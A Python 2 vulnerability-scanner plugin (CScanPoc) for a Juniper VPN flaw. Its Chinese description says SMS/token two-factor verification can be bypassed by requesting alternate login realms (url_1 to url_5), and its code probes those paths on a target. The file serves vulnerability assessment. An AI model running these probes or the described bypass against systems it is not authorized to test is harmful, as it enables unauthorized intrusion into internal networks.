# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse

class Vuln(ABVuln):
    vuln_id = 'Juniper_0002'  # 平台漏洞编号，留空
    name = 'Juniper VPN 存在缺陷可绕过短信token验证导致漫游内网'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2015-10-26'  # 漏洞公布时间
    desc = '''
        Juniper 一般是通过AD域验证或者预设账号验证，但是现在安全意识越来越好了，厂商们纷纷加入了短信，动态token验证，
        这样即使有了对应的账号密码也无法登陆VPN,
        想绕过动态码验证，更改 url_default 为 url_1 或者 url_2 或者 3,4,5 只要厂商自定义了其他页面，那就可能突破成功。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Juniper'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '78b8fc76-bed1-4df6-87be-bc8821c726f7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            payloads=(
                '/dana-na/auth/url_2/welcome.cgi',
                '/dana-na/auth/url_1/welcome.cgi',
                '/dana-na/auth/url_3/welcome.cgi',
                '/dana-na/auth/url_4/welcome.cgi',
                '/dana-na/auth/url_5/welcome.cgi'
            )
            for p in payloads:
                url = arg + p
                code2, head, res, errcode, _ = hh.http(url )
                if (code2 ==200) and ('action="login.cgi" method="POST' in res):  
                    #security_warning(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
